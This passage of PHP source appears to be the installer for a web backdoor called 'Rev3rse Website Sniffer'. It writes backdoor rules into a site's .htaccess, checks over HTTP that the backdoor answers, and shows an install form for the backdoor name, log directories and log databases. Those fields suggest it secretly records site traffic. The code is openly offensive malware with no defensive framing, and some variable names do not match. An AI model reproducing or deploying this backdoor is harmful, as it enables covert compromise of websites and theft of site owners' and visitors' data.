if(file_exists("$testdirr/index.php")) {
echo "<font size='3' color='#CC0000'>[-]</font>Could not delete test index @ $testdirr/index.php<br>";
} else {
echo "<font size='3' color='#00B300'>[+]</font>Delete test index @ $testdirr/index.php<br>";
}
if(file_exists($testdirr)) {
echo "<font size='3' color='#CC0000'>[-]</font>Could not delete test directory @ $testdirr<br>";
} else {
echo "<font size='3' color='#00B300'>[+]</font>Delete test directory @ $testdirr<br>";
}
}
// install to htaccess
$ht = fopen($hta, 'w');
fwrite($ht, "$old
");
fwrite($ht, $htdata);
fclose($ht);




echo "<font size='3' color='#00B300'>[+]</font>$hta backdoored<br>";




// run test to see if backdoor is successfull
$url	=	$_SERVER["SERVER_NAME"];
$tegcurr	 =	 $_POST['hta'];
$tegroot	 =	 str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
$tegdir	 =	 str_replace($egroot, '', $egcurr);


$page = file_get_contents("http://$url/$tegdir/?act=t");


if (@eregi('Success1982Rev3rse', $page)) {
echo "<font size='3' color='#00B300'>[+]</font>Backdoor response successfull<br>";
} else {
echo "<font size='3' color='#CC0000'>[-]</font>Backdoor response failed<br>";
}
} else {


$rand1	 =	 rand('0000', '9999');
$rand2	 =	 rand('0000', '9999');
$rand3	 =	 rand('0000', '9999');
$name	 =	 md5($rand3);
$root	 =	 $_SERVER['DOCUMENT_ROOT'];
$curr	 =	 getcwd();
$curr	 =	 str_replace('\\', '/', $curr);
// this is for later on in the install, no need to modify
$egcurr	 =	 str_replace('\\', '/', getcwd());
$egroot	 =	 str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']);
$egdir	 =	 str_replace($egroot, '', $egcurr);




echo "
<html>
<title>Rev3rse Website Sniffer :: Install</title>
<body bgcolor='#000000'> 


<font color='#ffffff' face='arial' size='5'>
<form name='input' action='' method='post'>






<table style='border-collapse:collapse;' width='100%' border='1' cellpadding='0' cellspacing='0'>
<tbody>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Install directory</td>
<TD Width='85%'><input type='text' name='idir' value='$curr/" . $name . "' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Backdoor name</td>
<TD Width='85%'><input type='text' name='fname' value='bd.tmp' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Htaccess path</td>
<TD Width='85%'><input type='text' name='hta' value='" . $root . "' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Logs directory</td>
<TD Width='85%'><input type='text' name='lto' value='/logs/' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Logs extension</td>
<TD Width='85%'><input type='text' name='lext' value='.txt' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Key 1</td>
<TD Width='85%'><input type='text' name='k1' value='__" . $rand1 . "__' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Seperator 2</td>
<TD Width='85%'><input type='text' name='sep1' value='__" . $rand2 . "__' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Seperator 3</td>
<TD Width='85%'><input type='text' name='sep2' value='__" . $rand3 . "__' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Log database: Main</td>
<TD Width='85%'><input type='text' name='db1' value='db.txt' size='190%' /></td>
</tr>
<tr>
<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Log database: Secure</td>
<TD Width='85%'><input type='text' name='db2' value='sdb.txt' size='190%' /></td>


</tr>
<tr>


<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Backdoor inclusion:</td>




<td>


<select name='method'><option value='0'>Auto - Perform check</option>
<option value='1'>Auto - Skip check</option>
<option value='2'>Manual</option></select>


</td>




</tr>
<tr>


<TD Width='15%'><b><font color='#ffffff' face='arial' size='3'> Test Directory:</td>
<TD Width='85%'><input type='text' name='test_dir' value='" . "$curr" . "' size='190%' /></td>
</tr>
</table>


<input type='submit' value='Submit' name='install' />
</form> ";
}










?>

